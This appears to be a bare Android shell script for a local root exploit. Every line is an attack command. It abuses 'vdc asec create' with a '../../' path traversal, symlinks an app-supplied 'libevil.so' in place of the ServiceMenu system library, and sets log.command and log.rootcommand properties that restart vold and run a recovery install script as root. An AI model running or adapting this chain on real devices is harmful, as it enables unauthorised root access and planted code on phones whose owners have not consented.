vdc asec destroy ../../data/app-lib/ServiceMenu 2>/dev/null
rm /data/app-lib/ServiceMenu/libservicemenu.so 2>/dev/null
rm /data/local/tmp/vlib 2>/dev/null 2>/dev/null

vdc asec create ../../data/app-lib/ServiceMenu 4 ext4 none 2000 0
ln -s /data/app-lib/com.peniscorp.bobsgamecontrols-1/libevil.so /data/app-lib/ServiceMenu/libservicemenu.so
ln -s /system/vendor/lib /data/local/tmp/vlib
setprop log.command "/system/bin/logwrapper /system/bin/sh -c 'stop vold && start vold'"
setprop log.rootcommand "/system/bin/logwrapper /system/bin/sh /data/local/tmp/recovery/install.sh vold"

